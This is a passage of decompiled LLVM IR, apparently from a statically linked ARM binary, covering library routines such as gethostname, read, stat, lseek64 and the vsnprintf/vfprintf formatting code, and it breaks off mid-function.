  store i32 2, i32* @r5, align 4
  br label %dec_label_pc_11efc

dec_label_pc_11efc:                               ; preds = %bb37, %dec_label_pc_11eb8, %dec_label_pc_11eec
  %v3_11efc = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_11efc, i32* @r0, align 4
  %v0_11f00 = call i32 @free()
  %v3_11f04 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_11f04, i32* @r0, align 4
  %v0_11f08 = call i32 @free()
  store i32 %v0_11f08, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11f14

dec_label_pc_11f10:                               ; preds = %dec_label_pc_11ce8, %dec_label_pc_11d0c
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_11f14

dec_label_pc_11f14:                               ; preds = %.thread, %bb, %bb34, %.thread7, %dec_label_pc_11cd4, %dec_label_pc_11cb4, %dec_label_pc_11efc, %dec_label_pc_11d70, %dec_label_pc_11f10
  %v0_11f14 = load i32, i32* @r5, align 4
  store i32 %v0_11f14, i32* %r0.global-to-local, align 4
  ret i32 %v0_11f14

; uselistorder directives
  uselistorder i32 %v0_11e90, { 1, 0 }
  uselistorder i32 %v1_11e6c, { 1, 0, 2 }
  uselistorder i32 %v1_11e68, { 1, 0 }
  uselistorder i32 %v0_11e38, { 1, 0, 2 }
  uselistorder i32 %v2_11e2c, { 1, 0 }
  uselistorder i32 %v1_11d2c, { 2, 1, 0 }
  uselistorder i32 %v1_11d20, { 1, 0 }
  uselistorder i32 %v0_11cf4, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32* %v1_11ca0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_11c40, { 1, 0 }
  uselistorder i32 %v0_11c34, { 1, 2, 3, 5, 4, 0, 6, 8, 7 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp18, { 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %tmp12, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 19, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17, 18 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 5, 4, 7, 6, 8, 19, 20, 10, 9, 12, 11, 13, 15, 14, 17, 16, 18 }
  uselistorder i32 ()* @free, { 22, 21, 20, 19, 18, 17, 11, 10, 9, 8, 7, 16, 15, 14, 13, 6, 5, 4, 3, 12, 23, 28, 27, 26, 1, 25, 24, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_11f14, { 8, 6, 0, 3, 7, 4, 5, 2, 1 }
  uselistorder label %dec_label_pc_11f10, { 1, 0 }
  uselistorder label %dec_label_pc_11efc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11eb8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ce8, { 2, 0, 1 }
}

define i32 @__GI_poll(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11f24 = load i32, i32* @r7, align 4
  store i32 %v3_11f24, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11f4c, label %dec_label_pc_11f3c

dec_label_pc_11f3c:                               ; preds = %entry
  %v0_11f3c = call i32 @__GI___errno_location()
  %v0_11f40 = load i32, i32* %r7.global-to-local, align 4
  %v1_11f40 = sub i32 0, %v0_11f40
  %v2_11f44 = inttoptr i32 %v0_11f3c to i32*
  store i32 %v1_11f40, i32* %v2_11f44, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_11f50.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11f4c

dec_label_pc_11f4c:                               ; preds = %entry, %dec_label_pc_11f3c
  %v2_11f50 = phi i32 [ %v3_11f24, %entry ], [ %v2_11f50.pre, %dec_label_pc_11f3c ]
  %v0_11f4c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_11f3c ]
  store i32 %v2_11f50, i32* @r7, align 4
  ret i32 %v0_11f4c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11f4c, { 1, 0 }
}

define i32 @__GI_gethostname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-341 = alloca i32, align 4
  %stack_var_-406 = alloca i32, align 4
  %v2_11f64 = ptrtoint i32* %stack_var_-406 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_11f74 = call i32 @uname(i32 %v2_11f64)
  %v7_11f78 = icmp eq i32 %v1_11f74, -1
  br i1 %v7_11f78, label %bb, label %dec_label_pc_11f84

bb:                                               ; preds = %entry
  store i32 %v1_11f74, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11fc0

dec_label_pc_11f84:                               ; preds = %entry
  %v2_11f84 = ptrtoint i32* %stack_var_-341 to i32
  %tmp10 = bitcast i32* %stack_var_-341 to i8*
  %v3_11f8c = call i32 @strlen(i8* %tmp10)
  %v1_11f90 = add i32 %v3_11f8c, 1
  %v1_11f94 = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_11f90, %v1_11f94
  br i1 %tmp, label %dec_label_pc_11f9c, label %dec_label_pc_11fb0

dec_label_pc_11f9c:                               ; preds = %dec_label_pc_11f84
  %v0_11f9c = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_11fa8 = inttoptr i32 %v0_11f9c to i32*
  store i32 22, i32* %v2_11fa8, align 4
  %v0_11fc0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11fc0

dec_label_pc_11fb0:                               ; preds = %dec_label_pc_11f84
  %v0_11fb0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v2_11f84, i32* @r1, align 4
  %v2_11fb8 = inttoptr i32 %v0_11fb0 to i8*
  %v3_11fb8 = call i32 @strcpy(i8* %v2_11fb8, i32 %v2_11f84)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11fc0

dec_label_pc_11fc0:                               ; preds = %bb, %dec_label_pc_11f9c, %dec_label_pc_11fb0
  %v0_11fc0 = phi i32 [ %v1_11f74, %bb ], [ %v0_11fc0.pre, %dec_label_pc_11f9c ], [ 0, %dec_label_pc_11fb0 ]
  ret i32 %v0_11fc0

; uselistorder directives
  uselistorder i32 %v2_11f84, { 1, 0 }
  uselistorder i32 %v1_11f74, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @strcpy, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_11fc0, { 2, 1, 0 }
}

define i32 @__GI_read(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11fd0 = load i32, i32* @r7, align 4
  store i32 %v3_11fd0, i32* %stack_var_-8, align 4
  %v0_11fdc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11fdc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11fdc, -4095
  br i1 %tmp, label %dec_label_pc_11ffc, label %dec_label_pc_11fec

dec_label_pc_11fec:                               ; preds = %entry
  %v0_11fec = call i32 @__GI___errno_location()
  %v0_11ff0 = load i32, i32* %r7.global-to-local, align 4
  %v1_11ff0 = sub i32 0, %v0_11ff0
  %v2_11ff4 = inttoptr i32 %v0_11fec to i32*
  store i32 %v1_11ff0, i32* %v2_11ff4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11ffc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11ffc

dec_label_pc_11ffc:                               ; preds = %entry, %dec_label_pc_11fec
  %v1_12000 = phi i32 [ %v0_11fdc, %entry ], [ -1, %dec_label_pc_11fec ]
  %v2_11ffc = phi i32 [ %v3_11fd0, %entry ], [ %v2_11ffc.pre, %dec_label_pc_11fec ]
  store i32 %v2_11ffc, i32* @r7, align 4
  ret i32 %v1_12000

; uselistorder directives
  uselistorder i32 %v0_11fdc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ffc, { 1, 0 }
}

define i32 @__GI_stat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1203c, label %dec_label_pc_12028

dec_label_pc_12028:                               ; preds = %entry
  %v0_12028 = call i32 @__GI___errno_location()
  %v0_1202c = load i32, i32* %r7.global-to-local, align 4
  %v1_1202c = sub i32 0, %v0_1202c
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_12034 = inttoptr i32 %v0_12028 to i32*
  store i32 %v1_1202c, i32* %v2_12034, align 4
  br label %dec_label_pc_1204c

dec_label_pc_1203c:                               ; preds = %entry
  %v2_1203c = icmp eq i32 %arg1, 0
  br i1 %v2_1203c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1203c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1203c, %bb
  call void @__pseudo_cond_branch(i1 %v2_1203c, i32 ptrtoint (i32* @global_var_10168.334 to i32))
  br label %dec_label_pc_1204c

dec_label_pc_1204c:                               ; preds = %dec_label_pc_12028, %.thread
  %v0_1204c = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_1204c

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1204c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1209c, label %dec_label_pc_12088

dec_label_pc_12088:                               ; preds = %entry
  %v0_12088 = call i32 @__GI___errno_location()
  %v0_1208c = load i32, i32* %r4.global-to-local, align 4
  %v1_1208c = sub i32 0, %v0_1208c
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_12094 = inttoptr i32 %v0_12088 to i32*
  store i32 %v1_1208c, i32* %v2_12094, align 4
  %v0_120a4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_120a4

dec_label_pc_1209c:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_1209c = icmp eq i32 %arg1, 0
  br i1 %v2_1209c, label %dec_label_pc_120b0, label %dec_label_pc_120a4

dec_label_pc_120a4:                               ; preds = %dec_label_pc_1209c, %dec_label_pc_12088
  %v0_120a4 = phi i32 [ %arg1, %dec_label_pc_1209c ], [ %v0_120a4.pre, %dec_label_pc_12088 ]
  br label %dec_label_pc_120b4

dec_label_pc_120b0:                               ; preds = %dec_label_pc_1209c
  br label %dec_label_pc_120b4

dec_label_pc_120b4:                               ; preds = %dec_label_pc_120a4, %dec_label_pc_120b0
  %v1_120bc = phi i32 [ %v0_120a4, %dec_label_pc_120a4 ], [ %tmp8, %dec_label_pc_120b0 ]
  ret i32 %v1_120bc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_120b4, { 1, 0 }
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_120cc = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_120cc, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_120e0 = call i32 @__GI_vsnprintf()
  ret i32 %v0_120e0

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v3_120f4 = load i32, i32* @r4, align 4
  %v6_120f4 = load i32, i32* @r5, align 4
  %v9_120f4 = load i32, i32* @r6, align 4
  %v12_120f4 = load i32, i32* @r7, align 4
  %v18_120f4 = load i32, i32* @sl, align 4
  %v2_120fc = ptrtoint i32* %stack_var_-112 to i32
  %v0_12100 = load i32, i32* @r0, align 4
  store i32 %v0_12100, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v2_12108 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_12108, i32* @r0, align 4
  %v0_12110 = load i32, i32* @r3, align 4
  store i32 %v0_12110, i32* @r7, align 4
  store i32 1, i32* @ip, align 4
  %v0_1211c = load i32, i32* @r1, align 4
  store i32 %v0_1211c, i32* @r5, align 4
  %v0_12120 = load i32, i32* @r2, align 4
  store i32 %v0_12120, i32* @r6, align 4
  store i32 208, i32* %stack_var_-112, align 4
  %v1_12134 = call i32 @__stdio_init_mutex(i32 %v2_12108)
  %v0_12138 = load i32, i32* @r4, align 4
  %v1_12138 = sub i32 -1, %v0_12138
  %v0_1213c = load i32, i32* @r5, align 4
  %v3_1213c = icmp ult i32 %v0_1213c, %v1_12138
  br i1 %v3_1213c, label %bb26, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_12138, i32* @r5, align 4
  br label %bb26

bb26:                                             ; preds = %entry, %bb
  %v1_12144 = phi i32 [ %v0_1213c, %entry ], [ %v1_12138, %bb ]
  %v2_12144 = add i32 %v1_12144, %v0_12138
  %v0_1214c = load i32, i32* @r6, align 4
  %v0_12150 = load i32, i32* @r7, align 4
  %v0_1215c = load i32, i32* @sl, align 4
  %v5_12168 = inttoptr i32 %v0_12138 to i8*
  %v15_12170 = inttoptr i32 %v0_1214c to i8*
  %v16_12170 = call i32 @_vfprintf_internal(i32 %v2_120fc, i8* %v15_12170, i32 %v0_12150, i32 %v2_12144, i32 %v0_12138, i32 %v2_12144, i32 %v0_12138, i32 %v0_12138, i32 %v0_12138, i32 %v2_12144, i32 %v0_1215c)
  %v0_12174 = load i32, i32* @r5, align 4
  %v1_12174 = load i32, i32* @sl, align 4
  %v9_12174 = icmp eq i32 %v0_12174, %v1_12174
  br i1 %v9_12174, label %dec_label_pc_1219c, label %dec_label_pc_12180

dec_label_pc_12180:                               ; preds = %bb26
  %v3_12144 = inttoptr i32 %v2_12144 to i8*
  %v9_12188 = icmp eq i8* %v5_12168, %v3_12144
  br i1 %v9_12188, label %bb27, label %bb28

bb27:                                             ; preds = %dec_label_pc_12180
  %v2_1218c = add i32 %v0_12138, -1
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_12180, %bb27
  %v1_12190 = phi i32 [ %v2_12144, %dec_label_pc_12180 ], [ %v2_1218c, %bb27 ]
  %v6_12190 = inttoptr i32 %v1_12190 to i8*
  %stack_var_-96.0 = select i1 %v9_12188, i8* %v6_12190, i8* %v5_12168
  %v1_12198 = trunc i32 %v1_12174 to i8
  store i8 %v1_12198, i8* %stack_var_-96.0, align 1
  br label %dec_label_pc_1219c

dec_label_pc_1219c:                               ; preds = %bb26, %bb28
  store i32 %v3_120f4, i32* @r4, align 4
  store i32 %v6_120f4, i32* @r5, align 4
  store i32 %v9_120f4, i32* @r6, align 4
  store i32 %v12_120f4, i32* @r7, align 4
  store i32 %v18_120f4, i32* @sl, align 4
  ret i32 %v16_12170

; uselistorder directives
  uselistorder i32 %v2_12144, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_12138, { 2, 1, 0 }
  uselistorder i32 %v0_12138, { 2, 4, 5, 7, 3, 6, 1, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1219c, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-25 = alloca i8, align 1
  %v3_121a8 = load i32, i32* @r4, align 4
  %v6_121a8 = load i32, i32* @r5, align 4
  %v9_121a8 = load i32, i32* @r6, align 4
  %v12_121a8 = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-25, align 1
  %v10_121b4 = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v10_121b4, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_121cc2 = icmp eq i32 %arg3, 0
  br i1 %v2_121cc2, label %dec_label_pc_121ec, label %dec_label_pc_121e0

dec_label_pc_121c8:                               ; preds = %dec_label_pc_121e0
  %v1_121c8 = add i32 %v0_121c8, -1
  store i32 %v1_121c8, i32* @r4, align 4
  %v2_121cc = icmp eq i32 %v1_121c8, 0
  %v0_121d8 = load i32, i32* @r7, align 4
  br i1 %v2_121cc, label %dec_label_pc_121ec.loopexit, label %dec_label_pc_121e0

dec_label_pc_121e0:                               ; preds = %entry, %dec_label_pc_121c8
  %v0_121d84 = phi i32 [ %v0_121d8, %dec_label_pc_121c8 ], [ %arg1, %entry ]
  %v3_121e0 = inttoptr i32 %v0_121d84 to i16*
  %v4_121e0 = call i32 @__stdio_fwrite(i32 %v10_121b4, i32 1, i16* %v3_121e0)
  %v7_121e4 = icmp eq i32 %v4_121e0, 1
  %v0_121c8 = load i32, i32* @r4, align 4
  br i1 %v7_121e4, label %dec_label_pc_121c8, label %dec_label_pc_121ec.loopexit

dec_label_pc_121ec.loopexit:                      ; preds = %dec_label_pc_121c8, %dec_label_pc_121e0
  %v0_121ec.ph = phi i32 [ %v0_121c8, %dec_label_pc_121e0 ], [ 0, %dec_label_pc_121c8 ]
  %v1_121ec.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_121ec

dec_label_pc_121ec:                               ; preds = %dec_label_pc_121ec.loopexit, %entry
  %v1_121ec = phi i32 [ 0, %entry ], [ %v1_121ec.pre, %dec_label_pc_121ec.loopexit ]
  %v0_121ec = phi i32 [ 0, %entry ], [ %v0_121ec.ph, %dec_label_pc_121ec.loopexit ]
  %v2_121ec = sub i32 %v1_121ec, %v0_121ec
  store i32 %v3_121a8, i32* @r4, align 4
  store i32 %v6_121a8, i32* @r5, align 4
  store i32 %v9_121a8, i32* @r6, align 4
  store i32 %v12_121a8, i32* @r7, align 4
  ret i32 %v2_121ec

; uselistorder directives
  uselistorder i32 %v1_121c8, { 1, 0 }
  uselistorder label %dec_label_pc_121ec.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_121e0, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_121fc = load i32, i32* @r4, align 4
  store i32 %v3_121fc, i32* %stack_var_-24, align 4
  %v6_121fc = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_12204 = and i32 %arg2, 128
  %v2_12204 = icmp eq i32 %v1_12204, 0
  %v0_12208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12208, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_12204, label %dec_label_pc_12258thread-pre-split, label %dec_label_pc_1221c

dec_label_pc_1221c:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_12220 = call i32 @strlen(i8* %arg4)
  store i32 %v3_12220, i32* %r0.global-to-local, align 4
  %v1_12224 = load i32, i32* %r4.global-to-local, align 4
  %v2_12224 = sub i32 %v1_12224, %v3_12220
  store i32 %v2_12224, i32* @r4, align 4
  store i32 %v3_12220, i32* @r6, align 4
  %tmp13 = icmp slt i32 %v2_12224, 1
  br i1 %tmp13, label %.thread, label %dec_label_pc_12238

.thread:                                          ; preds = %dec_label_pc_1221c
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12254

dec_label_pc_12238:                               ; preds = %dec_label_pc_1221c
  %v0_12238 = load i32, i32* @r5, align 4
  %v1_12238 = urem i32 %v0_12238, 128
  %v0_1223c = load i32, i32* @r8, align 4
  store i32 %v0_1223c, i32* %r0.global-to-local, align 4
  %v3_12244 = trunc i32 %v1_12238 to i8
  %v4_12244 = call i32 @_charpad(i32 %v0_1223c, i8 %v3_12244, i32 %v2_12224)
  store i32 %v4_12244, i32* %r0.global-to-local, align 4
  %v1_12248 = load i32, i32* @r4, align 4
  %v9_12248 = icmp eq i32 %v4_12244, %v1_12248
  store i32 %v4_12244, i32* %r5.global-to-local, align 4
  br i1 %v9_12248, label %dec_label_pc_12238.dec_label_pc_12254_crit_edge, label %dec_label_pc_12274

dec_label_pc_12238.dec_label_pc_12254_crit_edge:  ; preds = %dec_label_pc_12238
  %v0_12254.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12254

dec_label_pc_12254:                               ; preds = %.thread, %dec_label_pc_12238.dec_label_pc_12254_crit_edge
  %v0_12254 = phi i32 [ %v0_12254.pre, %dec_label_pc_12238.dec_label_pc_12254_crit_edge ], [ %v3_12220, %.thread ]
  store i32 %v0_12254, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12258

dec_label_pc_12258thread-pre-split:               ; preds = %entry
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12258

dec_label_pc_12258:                               ; preds = %dec_label_pc_12258thread-pre-split, %dec_label_pc_12254
  %v5_12264 = phi i32 [ %arg3, %dec_label_pc_12258thread-pre-split ], [ %v0_12254, %dec_label_pc_12254 ]
  %tmp14 = icmp slt i32 %v5_12264, 1
  br i1 %tmp14, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_12258
  br label %bb15

bb:                                               ; preds = %dec_label_pc_12258
  %v5_12260 = load i32, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %.thread5, %bb
  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_12260, %bb ]
  %tmp16 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp16, i32 ptrtoint (i32* @global_var_13a68.387 to i32))
  %v0_12270 = load i32, i32* %r5.global-to-local, align 4
  %v2_12270 = add i32 %storemerge, %v0_12270
  store i32 %v2_12270, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12274

dec_label_pc_12274:                               ; preds = %dec_label_pc_12238, %bb15
  %v0_12274 = phi i32 [ %v4_12244, %dec_label_pc_12238 ], [ %v2_12270, %bb15 ]
  store i32 %v0_12274, i32* %r0.global-to-local, align 4
  %v2_12278 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12278, i32* %r4.global-to-local, align 4
  store i32 %v6_121fc, i32* %r5.global-to-local, align 4
  ret i32 %v0_12274

; uselistorder directives
  uselistorder i32 %v0_12274, { 1, 0 }
  uselistorder i32 %v0_12254, { 1, 0 }
  uselistorder i32 %v2_12224, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_12274, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_12254, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp98 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i8 @__decompiler_undefined_function_2()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp106 = call i8 @__decompiler_undefined_function_2()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %v6_12280 = load i32, i32* @r5, align 4
  %v12_12280 = load i32, i32* @r7, align 4
  %v18_12280 = load i32, i32* @sb, align 4
  %v21_12280 = load i32, i32* @sl, align 4
  %v24_12280 = load i32, i32* @fp, align 4
  %v2_12288 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_12288, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_12288, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_12298 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_12298, i32* @r5, align 4
  %v2_1229c = call i32 @_ppfs_init(i32* nonnull %stack_var_-352)
  store i32 %v2_1229c, i32* %r0.global-to-local, align 4
  %v1_122a4 = icmp slt i32 %v2_1229c, 0
  br i1 %v1_122a4, label %dec_label_pc_122b4, label %dec_label_pc_122e8

dec_label_pc_122b4:                               ; preds = %entry
  %v3_122b4 = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_122b4, i32* @r4, align 4
  %v1_122b8 = inttoptr i32 %v3_122b4 to i8*
  store i32 %v3_122b4, i32* %r0.global-to-local, align 4
  %v3_122bc = call i32 @strlen(i8* %v1_122b8)
  store i32 %v3_122bc, i32* %r0.global-to-local, align 4
  %v2_122c0 = icmp eq i32 %v3_122bc, 0
  br i1 %v2_122c0, label %bb, label %dec_label_pc_122d0

bb:                                               ; preds = %dec_label_pc_122b4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12938

dec_label_pc_122d0:                               ; preds = %dec_label_pc_122b4
  %v0_122d0 = load i32, i32* @r4, align 4
  store i32 %v0_122d0, i32* %r0.global-to-local, align 4
  %v0_122d4 = load i32, i32* @fp, align 4
  store i32 %v0_122d4, i32* %r2.global-to-local, align 4
  %v3_122d8 = inttoptr i32 %v0_122d4 to i16*
  %v4_122d8 = call i32 @__stdio_fwrite(i32 %v0_122d0, i32 %v3_122bc, i16* %v3_122d8)
  store i32 %v4_122d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12938

dec_label_pc_122e8:                               ; preds = %entry
  %v0_122e8 = load i32, i32* @r5, align 4
  store i32 %v2_12288, i32* %r0.global-to-local, align 4
  %v2_122f0 = call i32 @_ppfs_prepargs(i32 %v2_12288, i32 %v0_122e8)
  store i32 %v2_122f0, i32* %r0.global-to-local, align 4
  %v0_12338 = load i32, i32* @r4, align 4
  store i32 %v0_12338, i32* %r2.global-to-local, align 4
  %v1_123bc = bitcast i32* %stack_var_-352 to i8*
  %v4_123cc = zext i8 %tmp106 to i32
  %tmp137 = icmp slt i32 %tmp107, 1
  %v7_123d8 = ptrtoint i32* %stack_var_-272 to i32
  %v2_123f0 = ptrtoint i32* %stack_var_-40 to i32
  %v2_1240c = icmp eq i32 %tmp104, 0
  %v2_12744 = ptrtoint i32* %stack_var_-200 to i32
  %v2_12788 = ptrtoint i32* %stack_var_-348 to i32
  %v2_1278c = ptrtoint i32* %stack_var_-72 to i32
  %v2_12640 = ptrtoint i32* %stack_var_-44 to i32
  %v2_1264c = ptrtoint i32* %stack_var_-52 to i32
  %v7_124a8 = zext i8 %tmp102 to i32
  %v2_124e0 = ptrtoint i32* %stack_var_-73 to i32
  %v1_124e8 = bitcast i32* %stack_var_-73 to i8*
  %v2_124f0 = icmp ugt i32 %tmp104, 4
  %v7_124f0 = icmp eq i32 %tmp104, 5
  %v7_123d4 = ptrtoint i32* %stack_var_-280 to i32
  %v5_12404195 = icmp sgt i32 %tmp105, 0
  %tmp207 = icmp ugt i32 %tmp104, 7
  %tmp208 = icmp ugt i32 %tmp104, 15
  %v2_12614 = icmp ugt i32 %tmp104, 16
  %v7_12614 = icmp eq i32 %tmp104, 17
  %v2_12618 = xor i1 %v7_12614, true
  %v3_12618 = and i1 %v2_12614, %v2_12618
  %v2_1269c = icmp ugt i32 %tmp104, 18
  %v7_1269c = icmp eq i32 %tmp104, 19
